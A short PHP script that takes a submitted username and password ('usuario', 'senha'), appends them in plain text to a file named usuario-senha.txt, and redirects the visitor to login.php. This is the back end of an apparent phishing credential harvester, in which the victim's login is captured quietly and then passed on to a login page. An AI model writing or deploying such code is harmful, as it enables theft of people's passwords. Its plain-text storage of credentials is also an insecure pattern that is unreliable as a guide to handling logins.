<?php 
session_start();

$use=$_POST['usuario'];
$pw=$_POST['senha'];


$dados = $use."-".$pw."\n";

$file = fopen("usuario-senha.txt", 'a+');

fwrite($file, $dados);
fclose($file);

header("location:login.php");


?>